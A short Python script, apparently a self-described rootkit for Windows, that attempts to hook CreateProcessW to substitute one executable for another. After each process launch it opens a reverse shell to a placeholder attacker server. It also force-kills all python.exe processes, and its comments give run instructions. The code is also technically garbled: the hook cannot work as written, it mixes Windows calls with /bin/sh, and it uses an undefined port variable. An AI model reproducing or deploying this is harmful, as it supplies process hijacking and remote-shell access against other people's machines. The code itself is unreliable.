import ctypes
import ctypes.wintypes
import socket
import subprocess
import os

CreateProcessW = ctypes.WINFUNCTYPE(ctypes.wintypes.BOOL, ctypes.wintypes.LPCWSTR, ctypes.wintypes.LPWSTR, ctypes.wintypes.LPVOID, ctypes.wintypes.LPVOID, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID, ctypes.wintypes.LPCWSTR, ctypes.POINTER(ctypes.wintypes.STARTUPINFOW), ctypes.POINTER(ctypes.wintypes.PROCESS_INFORMATION))

kernel32 = ctypes.windll.kernel32

original_CreateProcessW = kernel32.CreateProcessW

def hook_CreateProcessW(application_name, command_line, process_attributes, thread_attributes, inherit_handles, creation_flags, environment, current_directory, startup_info, process_information):
    if command_line:
        modified_command_line = command_line.replace("example.exe", "modified_example.exe")
        command_line = ctypes.create_unicode_buffer(modified_command_line)

    result = original_CreateProcessW(application_name, command_line, process_attributes, thread_attributes, inherit_handles, creation_flags, environment, current_directory, startup_info, process_information)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("your_server_ip", your_server_port))
        subprocess.Popen(["/bin/sh", "-i", "-c", s.makefile("rw").read()], stdin=s, stdout=s, stderr=s)
    except Exception as e:
        print(f"Failed to spawn reverse shell: {e}")

    return result

kernel32.CreateProcessW = hook_CreateProcessW

os.system("taskkill /F /IM python.exe /T")

# Test the rootkit
# Run the following command in a separate terminal:
# python rootkit.py
# Then, run the following command in another terminal:
# start example.exe
# The modified_example.exe should be executed instead of example.exe, and a reverse shell should be spawned on your server.